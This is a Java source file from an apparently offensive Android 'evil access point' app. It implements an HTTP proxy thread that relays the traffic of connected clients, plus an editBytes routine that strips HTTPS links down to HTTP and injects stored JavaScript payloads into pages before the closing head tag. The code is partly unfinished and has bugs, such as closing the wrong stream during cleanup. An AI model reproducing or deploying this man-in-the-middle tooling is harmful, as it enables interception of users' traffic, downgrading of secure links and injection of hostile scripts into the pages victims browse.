package com.nibiru.evil_ap.proxy;

import android.content.SharedPreferences;
import android.util.Log;

import com.nibiru.evil_ap.ConfigTags;
import com.nibiru.evil_ap.SharedClass;
import com.nibiru.evil_ap.log.Client;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by Nibiru on 2016-12-30.
 */

public class ThreadSockets implements Runnable {
    /**************************************CLASS FIELDS********************************************/
    protected final String TAG = getClass().getSimpleName();
    private Socket sClient;
    private Client c;
    private SharedPreferences mConfig;
    private SharedClass mSharedObj;
    private boolean debug = true;
    private boolean work = true;
    /**************************************CLASS METHODS*******************************************/
    ThreadSockets(Socket sClient, SharedPreferences config, SharedClass sharedObj) {
        this.sClient = sClient;
        mConfig = config;
        mSharedObj = sharedObj;
        //TODO: fucking shit is sometimes null
        c = mSharedObj.getClientByIp(sClient.getInetAddress().toString().substring(1));
    }
    //scalable socket programming (2014)
    //http://www.javaworld.com/article/2853780/core-java/socket-programming-for-scalable-systems.html
    @Override
    public void run() {
        //things we will eventually close
        BufferedReader inFromClient = null;
        OutputStream outToClient = null;
        InputStream inFromServer = null;
        PrintStream outToServer = null;
        try {
            // set input and output streams to read from and write to the client
            inFromClient = new BufferedReader(new InputStreamReader(sClient.getInputStream()));
            outToClient = sClient.getOutputStream();

            //get client request string
            String sRequest = getRequestString(inFromClient);

            //get server IP address
            String host = getHeader("host", sRequest);
            InetAddress address = InetAddress.getByName(host);
            //check if connection is keep-alive and update work
            //work = sRequest.contains("keep-alive");

            // connect to the server
            Socket socket = new Socket( address.getHostAddress(), 80 );
            // set input and output streams to read from and write to the server
            outToServer = new PrintStream( socket.getOutputStream() );
            inFromServer = socket.getInputStream();

            //send request
            outToServer.print(sRequest);

            //read headers
            String headers = readHeaders(inFromServer);
            //read body
            byte[] body = readStream(inFromServer);
            //byte[] resBytes = readStream(inFromServer);
            String response = new String(body, "UTF-8");
            //String headers = response.substring(0, response.indexOf("\r\n\r\n")+4);
            //String body = response.substring(response.indexOf("\r\n\r\n")+4);
            //DEBUG HERE!
            //sendChunk(headers.getBytes(), outToClient);
            sendChunk(body, outToClient);
            //sendChunkToOutStream(body, outToClient);
            //send end chunk
            //sendChunkToOutStream("".getBytes(), outToClient);

            /*while (work) {
                //get client request string
                sRequest = getRequestString(inFromClient);
                //check if connection is keep-alive and update work
                work = sRequest.contains("keep-alive");
                //send request
                outToServer.print(sRequest);
                if (debug) Log.d(TAG, "[OUT]Sent request to webserver!");
                //read headers
                headers = readHeaders(inFromServer);
                //read body
                body = readStream(inFromServer);
                if (debug) Log.d(TAG, "[IN]Got response from webserver!");

                //send response to client
                sendChunk(headers.getBytes(), outToClient);
                sendChunk(body, outToClient);
            }*/

        } catch (IOException e) {
            if (e instanceof SocketTimeoutException)
                Log.e(TAG, "TIMEOUT!");
            else
                e.printStackTrace();
        } finally {
            //clean up
            try {
                if (inFromServer != null) outToClient.close();
                if (outToServer != null) outToClient.close();
                if (inFromClient != null) outToClient.close();
                if (outToClient != null) outToClient.close();
                if (sClient != null) sClient.close();
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void sendChunk(byte[] msg, OutputStream out){
        try {
            out.write(msg, 0, msg.length);
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (debug) Log.d(TAG + "[OUT]", "sent chunk!");
    }

    private byte[] editBytes(byte[] bytesBody, Boolean sslStrip, Boolean jsInject) {
        try {
            String response = new String(bytesBody, "UTF-8");
            if (sslStrip) {
                response = response.replaceAll("https", "http");
            }
            if (jsInject){
                List<String> payloads = mSharedObj.getPayloads();
                String full = "";
                for(String p: payloads){
                    full += p;
                }
                response = response.replaceAll("</head>", full + "</head>");
            }
            return response.getBytes();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }

    private String getResponseHeaders(Response res, int len, String eTag) throws IOException {
        String resToClient = "";
        if (debug) Log.d(TAG, "<==================Sending response==================>");
        //find status line
        // /n ! not /r/n !
        switch (res.code()) {
            case 200: resToClient += "HTTP/1.1 200 OK\n"; break;
            case 204: resToClient += "HTTP/1.1 204 No Content\n"; break;
            case 301: resToClient += "HTTP/1.1 301 Moved Permanently\n"; break;
            case 302: resToClient += "HTTP/1.1 302 Found\n"; break;
            case 304: resToClient += "HTTP/1.1 304 Not Modified\n"; break;
            case 403: resToClient += "HTTP/1.1 403 Forbidden\n"; break;
            case 404: resToClient += "HTTP/1.1 404 Not Found\n"; break;
            default: Log.e(TAG, "UNKNOWN STATUS CODE = " + res.code());
        }
        //send headers
        resToClient += res.headers().toString() + "\n";
        //workaround for okhttp transparent gzip
        resToClient = resToClient.replace("Transfer-Encoding: chunked", "Content-Length: " + len);
        //workaround for 304's not working
        if (resToClient.startsWith("HTTP/1.1 304")) {
            resToClient = resToClient.replaceAll("ETag:.*", "ETag: " + eTag);
        }
        //TODO: test preformance
        //resToClient = resToClient.replaceAll("(?i)Connection: keep-alive", "Connection: close");
        //resToClient = resToClient.replaceAll("(?i)\\nKeep-Alive.*", "");
        return resToClient;
    }

    private String getRequestString(BufferedReader in) throws IOException {
        StringBuilder request = new StringBuilder();
        String body = "";
        String line;
        int length = 0;
        //read string request until there are no lines to read
        while ((line = in.readLine()) != null) {
            //last line of request message header is a blank line (\r\n\r\n)
            if (line.isEmpty()) {
                break;
            }
            if (line.startsWith("Content-Length")) { //get the content-length
                int index = line.indexOf(':') + 1;
                String len = line.substring(index).trim();
                length = Integer.parseInt(len);
            }
            //make sure content is not zipped...
            //by not including the Accept-Encoding header
            if (!line.startsWith("Accept-Encoding")) {
                /*Log.d(TAG + "[IN]", "Accept-Encoding: identity");
                request += "Accept-Encoding: identity\r\n";*/
                if (debug) Log.d(TAG + "[IN]", line);
                request.append(line).append("\r\n");
            }
        }
        request.append("\r\n");
        // if there is Message body, go in to this loop
        if (length > 0) {
            int read;
            while ((read = in.read()) != -1) {
                body += ((char) read);
                if (body.length() == length) break;
            }
        }
        request.append(body); // adding the body to request
        return request.toString();
    }

    private String getHeader(String header, String msg){
        String pattern = "(?i)" + header + ": (.*)";
        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(msg);
        if (m.find()) {
            return m.group(1);
        }else {
            return null;
        }
    }

    private byte[] readStream(InputStream is) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        int nRead;
        byte[] data = new byte[16384];
        while ((nRead = is.read(data, 0, data.length)) != -1) {
            String test = new String(data, "UTF-8");
            buffer.write(data, 0, nRead);
        }
        buffer.flush();
        return buffer.toByteArray();
    }

    private void sendChunkToOutStream(byte[] msg, OutputStream out){
        String chunk = Integer.toHexString(msg.length);
        byte[] delim = "\r\n".getBytes();
        byte[] chunkArr = new byte[chunk.length()+2+msg.length+2];
        // create chunk byte array
        System.arraycopy(chunk.getBytes(), 0, chunkArr, 0, chunk.length()); //hex len
        System.arraycopy(delim, 0, chunkArr, chunk.length(), delim.length); // /r/n
        System.arraycopy(msg, 0, chunkArr, chunk.length()+delim.length, msg.length); // msg
        System.arraycopy(delim, 0, chunkArr, chunk.length()+delim.length+msg.length, delim.length);
        try {
            out.write(chunkArr, 0, chunkArr.length);
            String test  = new String(chunkArr, "UTF-8");
            out.flush();
        } catch (IOException e) {
            e.printStackTrace();
            work = false;
        }
        if (debug) Log.d(TAG + "[OUT]", "sent chunk!");
    }

    private String readHeaders(InputStream is) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        StringBuilder result = new StringBuilder();
        String line;
        while ( !(line = br.readLine()).trim().isEmpty() ){
            result.append(line).append("\r\n");
        }
        result.append("\r\n");
        return result.toString();
    }

    private String readHeaders2(InputStream is) throws IOException {
        StringBuilder result = new StringBuilder();
        StringBuilder line = new StringBuilder();
        int x;
        //while ( line.)
        while ( (x = is.read()) != 10 ){ // 10 = \n
            result.append((char)x);
        }
        result.append("\r\n");
        return result.toString();
    }

    private byte[] readChunk(InputStream is) throws IOException {
        //read line to find number of bytes
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        String line;
        int len =0;
        while ( !(line = br.readLine()).trim().isEmpty() ){
            len = Integer.parseInt(line.trim(), 16);
        }
        byte[] result = new byte[len];
        is.read(result, 0, len);
        return result;
    }
}
